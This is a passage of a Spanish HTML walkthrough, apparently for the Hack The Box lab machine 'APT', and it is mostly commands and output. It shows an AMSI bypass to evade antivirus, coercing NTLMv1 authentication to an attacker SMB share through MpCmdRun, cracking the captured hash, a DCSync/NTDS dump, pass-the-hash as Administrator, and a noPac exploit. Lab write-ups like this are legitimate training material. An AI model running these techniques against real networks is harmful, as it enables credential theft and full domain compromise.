+<code><span class="ve">❯ evil-winrm </span><span class="p">-i htb.local -u henry.vinson_adm -p G1#Ny5@2dvht
+PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">whoami</span><span class="p">
+htb\henry.vinson_adm
+PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+8e6**************************56e
+PS C:\Users\henry.vinson_adm\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Para enumerar posibles vias en la maquina podriamos subir <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a> sin embargo tenemos una limitacion y es el <code class="language-plaintext highlighter-rouge">antivirus</code> que lo detecta y no nos permite ejecutarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">upload </span><span class="p">winpeas.exe
+</span><span class="az">
+Info: Uploading winpeas.exe to C:\Users\henry.vinson_adm\Documents\winpeas.exe
+</span><span class="sa">
+Data: 3166888 bytes of 3166888 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">.\winpeas.exe
+</span><span class="ro">Program 'winpeas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\winpeas.exe
++ ~~~~~~~~~~~~~.
+At line:1 char:1
++ .\winpeas.exe
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed</span><span class="p">
+PS C:\Users\henry.vinson_adm\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovechar las funciones de <code class="language-plaintext highlighter-rouge">evil-winrm</code> para bypassearlo iniciando con <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code> para parchear el amsi y <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> para ejecutarlo desde fuera</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">Bypass-4MSI
+</span><span class="az">
+Info: Patching 4MSI, please be patient...
+</span><span class="ve">
+[+] Success!
+</span><span class="p">
+PS C:\Users\henry.vinson_adm\Documents> </span><span class="am">Invoke-Binary </span><span class="p">/home/kali/winpeas.exe  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En las configuraciones ntlm nos dice que la maquina usa <code class="language-plaintext highlighter-rouge">NTLMv1</code> para autenticarse</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">╔══════════╣ </span><span class="ve">Enumerating NTLM Settings
+</span><span class="ro">  LanmanCompatibilityLevel    : 2 (Send NTLM response only)
+
+</span><span class="az">  NTLM Signing Settings</span><span class="p">
+      ClientRequireSigning    : </span><span class="ro">False</span><span class="p">
+      ClientNegotiateSigning  : </span><span class="ve">True</span><span class="p">
+      ServerRequireSigning    : </span><span class="ve">True</span><span class="p">
+      ServerNegotiateSigning  : </span><span class="ve">True</span><span class="p">
+      LdapSigning             : </span><span class="am">Negotiate signing </span><span class="p">(</span><span class="am">Negotiate signing</span><span class="p">)
+
+</span><span class="az">  Session Security</span><span class="p">
+</span><span class="ve">      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)  
+</span><span class="ro">        [!] NTLM clients support NTLMv1!
+</span><span class="ve">      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)  
+</span><span class="ro">        [!] NTLM services on this machine support NTLMv1!
+
+</span><span class="az">  NTLM Auditing and Restrictions</span><span class="p">
+      InboundRestrictions     :  (Not defined)
+</span><span class="ro">      OutboundRestrictions    :  (Not defined)</span><span class="p">
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      :</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para adaptarnos a <code class="language-plaintext highlighter-rouge">crackers</code> mas conocidos que tiran de <code class="language-plaintext highlighter-rouge">tablas</code> precomputadas como <a href="https://crack.sh/netntlm/">crack.sh</a> el <code class="language-plaintext highlighter-rouge">Challenge</code> de responder lo modificaremos a <code class="language-plaintext highlighter-rouge">1122334455667788</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ grep </span><span class="p">Challenge /etc/responder/Responder.conf  
+Challenge = 1122334455667788</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">responder</code> nos ponemos en escucha de trafico indicando la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y con el parametro <code class="language-plaintext highlighter-rouge">--lm</code> para forzar el <code class="language-plaintext highlighter-rouge">downgrade</code> hacia las versiones antiguas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder </span><span class="p">-I tun0 --lm
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aprovechando el <code class="language-plaintext highlighter-rouge">antivirus</code> podemos hacer un escaneo a un archivo especifico usando <code class="language-plaintext highlighter-rouge">MpCmdRun.exe</code> apuntando a un recurso <code class="language-plaintext highlighter-rouge">SMB</code> que lleve a nuestro host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Program Files\Windows Defender> </span><span class="am">.\MpCmdRun.exe </span><span class="c1">-Scan -ScanType </span><span class="p">3 </span><span class="c1">-File </span><span class="p">\\10.10.14.10\kali\test.txt  
+PS C:\Program Files\Windows Defender></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Volvemos al <code class="language-plaintext highlighter-rouge">responder</code> en escucha y podemos ver que el equipo <code class="language-plaintext highlighter-rouge">APT$</code> ha realizado una <code class="language-plaintext highlighter-rouge">autenticación</code> hacia nuestro host y recibimos su hash en el formato <code class="language-plaintext highlighter-rouge">NTLMv1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo responder </span><span class="p">-I tun0 --lm
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           </span><span class="am">NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+</span><span class="ve">[+] </span><span class="p">Listening for events...
+
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Client   : </span><span class="am">10.10.10.213
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Username : </span><span class="am">HTB\APT$
+</span><span class="az">[SMB] </span><span class="p">NTLMv1 Hash     : </span><span class="am">APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que la fuerza bruta probablemente nos tomaria dias, tiraremos de <a href="https://crack.sh/get-cracking/">crack.sh</a>, indicandole nuestro <code class="language-plaintext highlighter-rouge">correo</code> y pasandole nuestro <code class="language-plaintext highlighter-rouge">hash</code> en el siguiente <code class="language-plaintext highlighter-rouge">formato</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384  </span>
+</code></pre></div></div><br>
+
+<a href="/htb/apt/4.png" target="_blank"><div><p><img src="/htb/apt/4.png"></p></div></a>
+
+<p class="plain-text">Pasados unos minutos recibiremos un <code class="language-plaintext highlighter-rouge">correo</code> de crack.sh con los <code class="language-plaintext highlighter-rouge">resultados</code> de la petición, donde ha logrado conseguir el hash <code class="language-plaintext highlighter-rouge">NT</code> con nuestro input que enviamos</p>
+<a href="/htb/apt/5.png" target="_blank"><div><p><img src="/htb/apt/5.png"></p></div></a>
+
+<p class="plain-text">Ya que la máquina <code class="language-plaintext highlighter-rouge">APT$</code> tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio al ser el <code class="language-plaintext highlighter-rouge">DC</code> podemos hacerlo directamente con <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver todos los hashes NT</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u APT$ -H d167c3238864b12f5f82feae86a7f798 --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">htb.local\APT$:d167c3238864b12f5f82feae86a7f798
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el hash de <code class="language-plaintext highlighter-rouge">Administrator</code> podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i htb.local -u Administrator -H c370bddf384a691d811ff3495e8a72e2  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
+b65**************************9b1
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra-administrator">
+<br><h3 class="post-title">Extra - Administrator</h3><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a> donde aunque el parametro <code class="language-plaintext highlighter-rouge">-shell</code> no funcionará por la limitacion <code class="language-plaintext highlighter-rouge">IPv6</code> si que nos crea un ticket como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">noPac.py htb.local/henry.vinson_adm:G1#Ny5@2dvht
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 999
+[-] Resolved Failed: The DNS query name does not exist: apt.htb.local.
+[*] Selected Target apt.htb.local
+[*] Total Domain Admins 1
+[*] will try to impersonate Administrator
+[*] Adding Computer Account "WIN-ZYHECMXKONN$"
+[*] MachineAccount "WIN-ZYHECMXKONN$" password = I)FewTxu4du0
+[*] Successfully added machine account WIN-ZYHECMXKONN$ with password I)FewTxu4du0.
+[*] WIN-ZYHECMXKONN$ object = CN=WIN-ZYHECMXKONN,CN=Computers,DC=htb,DC=local
+[*] WIN-ZYHECMXKONN$ sAMAccountName == apt
+[*] Saving a DC's ticket in apt.ccache
+[*] Reseting the machine account to WIN-ZYHECMXKONN$
+[*] Restored WIN-ZYHECMXKONN$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*] Saving a user's ticket in Administrator.ccache
+[*] Rename ccache to Administrator_apt.htb.local.ccache
+[*] Attempting to del a computer with the name: WIN-ZYHECMXKONN$
+[-] Delete computer WIN-ZYHECMXKONN$ Failed! Maybe the current user does not have permission.  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar el ticket para autenticarnos y con <code class="language-plaintext highlighter-rouge">crackmapexec</code> autenticandonos por kerberos como somos <code class="language-plaintext highlighter-rouge">Administrator</code> podemos dumpear nuevamente el <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator_apt.htb.local.ccache
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -k --use-kcache --ntds drsuapi
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator from ccache </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">WIN-ZYHECMXKONN$:5604:aad3b435b51404eeaad3b435b51404ee:6a1c6494d5e17e081219b6ebdac76026:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el hash de <code class="language-plaintext highlighter-rouge">Administrator</code> podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i htb.local -u Administrator -H c370bddf384a691d811ff3495e8a72e2  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type </span><span class="p">..\Desktop\root.txt
+b65**************************9b1
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
